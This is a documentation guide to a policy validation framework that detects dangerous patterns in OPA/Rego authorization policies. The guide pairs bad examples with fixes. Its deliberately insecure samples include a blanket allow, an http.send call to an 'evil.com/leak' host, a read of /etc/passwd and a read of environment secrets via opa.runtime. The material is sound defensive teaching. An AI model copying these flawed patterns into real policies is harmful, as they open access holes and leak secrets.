# Policy Validation Guide

This document describes the SARK policy validation framework, which prevents OPA policy injection attacks and ensures policy quality before deployment.

## Overview

The policy validation framework provides:
- ✅ **Syntax validation** via `opa check`
- ✅ **Required rules verification** (allow, deny, reason)
- ✅ **Forbidden pattern detection** (14+ security vulnerabilities)
- ✅ **Sample input testing** to verify policy behavior
- ✅ **Automated test suites** using YAML

## Quick Start

```python
from sark.policy import PolicyValidator, PolicyLoader

# Validate a policy
validator = PolicyValidator(strict=True)
result = validator.validate_file(Path("policy.rego"))

if not result.valid:
    for issue in result.critical_issues:
        print(f"CRITICAL: {issue.message}")

# Load with validation
loader = PolicyLoader(auto_validate=True)
content, validation = loader.load_policy(Path("policy.rego"))
```

## Forbidden Patterns

The validator detects the following security vulnerabilities:

### CRITICAL Severity

#### 1. BLANKET_ALLOW
**Pattern:** `default allow := true`

**Why it's dangerous:** Allows everything by default, violating zero-trust principles.

**Example (BAD):**
```rego
package bad.policy

default allow := true  # ❌ CRITICAL
```

**Fix:**
```rego
package good.policy

default allow := false  # ✅ Deny by default
allow if {
    input.user.role == "admin"
}
```

---

#### 2. FORBIDDEN_HTTP_SEND
**Pattern:** `http.send(`

**Why it's dangerous:** External HTTP calls can:
- Leak sensitive data (SSRF vulnerability)
- Create side effects in authorization decisions
- Depend on external services (availability issues)

**Example (BAD):**
```rego
allow if {
    response := http.send({  # ❌ CRITICAL - SSRF risk
        "method": "GET",
        "url": "https://evil.com/leak"
    })
    response.status_code == 200
}
```

**Fix:** Pass required data via policy inputs instead:
```rego
allow if {
    # ✅ Data passed via input, no external calls
    input.external_auth_check == true
}
```

---

#### 3. FORBIDDEN_OPA_RUNTIME
**Pattern:** `opa.runtime(`

**Why it's dangerous:** Accesses OPA runtime information which may leak:
- Environment variables (secrets, API keys)
- System configuration
- OPA internals

**Example (BAD):**
```rego
allow if {
    runtime := opa.runtime()  # ❌ CRITICAL - leaks env vars
    runtime.env.SECRET_KEY == input.key
}
```

**Fix:** Use policy inputs only:
```rego
allow if {
    input.provided_key == data.expected_key  # ✅ Safe
}
```

---

#### 4. FORBIDDEN_FILE_ACCESS
**Pattern:** `file.read(` or `file.write(` or `file.remove(`

**Why it's dangerous:**
- File system access in policies creates side effects
- Can leak sensitive files
- Creates deployment dependencies

**Example (BAD):**
```rego
allow if {
    contents := file.read("/etc/passwd")  # ❌ CRITICAL
    contains(contents, input.username)
}
```

**Fix:** Load data via OPA data documents:
```rego
# Load data at policy load time
import data.users

allow if {
    data.users[input.username]  # ✅ Safe
}
```

---

#### 5. UNCONDITIONAL_ALLOW
**Pattern:** `allow := true$` (without `if`)

**Why it's dangerous:** Creates an allow rule with no conditions, allowing everything.

**Example (BAD):**
```rego
allow := true  # ❌ CRITICAL - allows everything
```

**Fix:**
```rego
allow if {  # ✅ Conditional allow
    input.user.role == "admin"
}
```

---

#### 6. EMPTY_ALLOW_CONDITION
**Pattern:** `allow if { }`

**Why it's dangerous:** Empty condition block allows everything.

**Example (BAD):**
```rego
allow if {
}  # ❌ CRITICAL - empty condition
```

**Fix:**
```rego
allow if {
    input.user.role == "admin"  # ✅ Actual checks
    input.action == "read"
}
```

---

#### 7. FORBIDDEN_EVAL
**Pattern:** `eval(`

**Why it's dangerous:** Dynamic evaluation can enable code injection.

**Example (BAD):**
```rego
allow if {
    eval(input.policy_code)  # ❌ CRITICAL - code injection
}
```

**Fix:** Write explicit policy logic - no dynamic evaluation needed.

---

### HIGH Severity

#### 8. MISSING_DEFAULT_DENY
**Detection:** Policy has `allow` rules but no `default allow := false`

**Why it's important:** Explicit default deny ensures fail-secure behavior.

**Fix:**
```rego
default allow := false  # ✅ Add this

allow if { ... }
```

---

#### 9. MISSING_REASON
**Detection:** No `reason := ...` rule defined

**Why it's important:** Audit trails require reasons for allow/deny decisions.

**Fix:**
```rego
reason := "Admin access granted" if { allow }
reason := "Access denied - insufficient permissions" if { not allow }
```

---

#### 10. OVERLY_BROAD_CIDR
**Pattern:** `net.cidr_contains_matches("0.0.0.0/0"...`

**Why it's dangerous:** 0.0.0.0/0 matches all IP addresses.

**Fix:** Use specific CIDR ranges:
```rego
# ❌ BAD
allow if { net.cidr_contains_matches("0.0.0.0/0", input.ip) }

# ✅ GOOD
allow if { net.cidr_contains_matches("10.0.0.0/8", input.ip) }
```

---

#### 11. OVERLY_BROAD_REGEX
**Pattern:** `regex.match(".*"...`

**Why it's dangerous:** `.*` matches everything.

**Fix:** Use specific patterns:
```rego
# ❌ BAD
allow if { regex.match(".*", input.resource) }

# ✅ GOOD
allow if { regex.match("^projects/[a-z0-9-]+$", input.resource) }
```

---

### MEDIUM Severity

#### 12. DEBUG_TRACE
**Pattern:** `trace(`

**Why it's a concern:** May leak sensitive data in logs.

**Recommendation:** Remove before production deployment.

---

#### 13. DEBUG_PRINT
**Pattern:** `print(`

**Why it's a concern:** May leak sensitive data in logs.

**Recommendation:** Remove before production deployment.

---

#### 14. WALK_FULL_INPUT
**Pattern:** `walk(input)`

**Why it's a concern:** Walking entire input tree has performance implications.

**Recommendation:** Walk specific subtrees:
```rego
# ❌ MEDIUM - walks everything
walk(input)

# ✅ BETTER - walks specific subtree
walk(input.resources)
```

---

### INFO Severity

#### 15. TODO_COMMENT
**Pattern:** `# TODO` or `# FIXME` or `# HACK`

**Why it's flagged:** Indicates incomplete policy.

**Recommendation:** Address TODOs before production deployment.

---

## Validation Modes

### Strict Mode (Default)
Rejects policies with CRITICAL, HIGH, or MEDIUM severity issues.

```python
validator = PolicyValidator(strict=True)  # Default
```

### Lenient Mode
Only rejects CRITICAL severity issues.

```python
validator = PolicyValidator(strict=False)
```

## Required Rules

Valid authorization policies must have:

1. **Package declaration**
   ```rego
   package my.policy
   ```

2. **At least one `allow` or `deny` rule**
   ```rego
   allow if { ... }
   # OR
   deny contains "reason" if { ... }
   ```

3. **Reason rule** (HIGH severity if missing)
   ```rego
   reason := "..." if { ... }
   ```

4. **Default deny** (HIGH severity if missing when allow rules exist)
   ```rego
   default allow := false
   ```

## Sample Input Testing

Validate policy behavior with sample inputs:

```python
validator = PolicyValidator()

sample_inputs = [
    {"user": {"role": "admin"}, "action": "delete"},
    {"user": {"role": "user"}, "action": "read"},
]

result = validator.validate(
    policy_content,
    sample_inputs=sample_inputs
)
```

## YAML Test Suites

Create comprehensive test suites:

```yaml
# tests/my_policy.yaml
suite_name: "Authorization Policy Tests"
description: "Test suite for user authorization"
policy: "../policies/auth.rego"

tests:
  - name: "Admin can delete"
    description: "Administrators should be able to delete resources"
    input:
      user:
        role: "admin"
        email: "admin@example.com"
      action: "delete"
      resource: "project-123"
    expected:
      allow: true

  - name: "User cannot delete"
    description: "Regular users should not be able to delete"
    input:
      user:
        role: "user"
      action: "delete"
    expected:
      allow: false
```

Run tests:
```python
from sark.policy import PolicyTestRunner

runner = PolicyTestRunner()
result = runner.run_test_suite(Path("tests/my_policy.yaml"))

print(f"Passed: {result.passed}/{result.total}")
```

## Integration with Policy Loading

The PolicyLoader automatically validates policies:

```python
from sark.policy import PolicyLoader, PolicyLoadError

loader = PolicyLoader(strict=True, auto_validate=True)

try:
    content, validation = loader.load_policy(Path("policy.rego"))
    # Policy is valid and loaded
except PolicyLoadError as e:
    # Validation failed
    print(f"Validation errors:\n{e}")

    if e.validation_result:
        for issue in e.validation_result.critical_issues:
            print(f"  CRITICAL: {issue.message}")
```

## Best Practices

1. **Always use `default allow := false`**
   - Fail-secure by default

2. **Provide detailed reason strings**
   - Aids debugging and audit trails

3. **Never use external HTTP calls**
   - Pass required data via inputs

4. **Be specific in patterns**
   - Avoid `.*`, `0.0.0.0/0`, etc.

5. **Write test suites**
   - Verify policy behavior before deployment

6. **Run validation in CI/CD**
   - Catch issues before production

7. **Use strict mode in production**
   - Maximum security

## Example: Complete Valid Policy

```rego
package sark.authorization

import future.keywords.if
import future.keywords.in

# ===================================
# Default Deny
# ===================================

default allow := false

# ===================================
# Authorization Rules
# ===================================

# Allow admins to perform any action
allow if {
    input.user.roles[_] == "admin"
}

# Allow users to read their own resources
allow if {
    input.action == "read"
    input.resource.owner == input.user.id
}

# Allow users with specific permissions
allow if {
    permission := sprintf("%s:%s", [input.action, input.resource.type])
    permission in input.user.permissions
}

# ===================================
# Deny Rules (Explicit Denies)
# ===================================

deny contains "Cannot delete system resources" if {
    input.action == "delete"
    input.resource.system == true
    input.user.roles[_] != "admin"
}

# ===================================
# Audit Reasons
# ===================================

reason := msg if {
    allow
    input.user.roles[_] == "admin"
    msg := sprintf("Admin %s granted access", [input.user.email])
}

reason := msg if {
    allow
    not input.user.roles[_] == "admin"
    msg := sprintf("User %s has required permissions", [input.user.email])
}

reason := msg if {
    not allow
    count(deny) > 0
    msg := concat("; ", deny)
}

reason := "Access denied - insufficient permissions" if {
    not allow
    count(deny) == 0
}
```

## CLI Tools

### Validate a Policy
```bash
python -m sark.policy.validate path/to/policy.rego
```

### Run Test Suite
```bash
python -m sark.policy.test path/to/tests.yaml
```

### Batch Validate Directory
```bash
python -m sark.policy.validate-dir opa/policies/
```

## API Reference

See the inline documentation in:
- `src/sark/policy/validator.py` - PolicyValidator class
- `src/sark/policy/loader.py` - PolicyLoader class
- `src/sark/policy/test_runner.py` - PolicyTestRunner class

## Security Considerations

1. **Trust Boundary**: Validation happens at policy load time, not runtime
2. **Defense in Depth**: Validation complements OPA's built-in security
3. **No Silver Bullet**: Validation detects known patterns, not all vulnerabilities
4. **Regular Updates**: Forbidden pattern list evolves with new threats

## Support

For issues or questions:
- Review existing policies in `opa/policies/examples/`
- Check test suites in `opa/policies/tests/`
- Consult POLICY_AUTHORING_GUIDE.md for examples
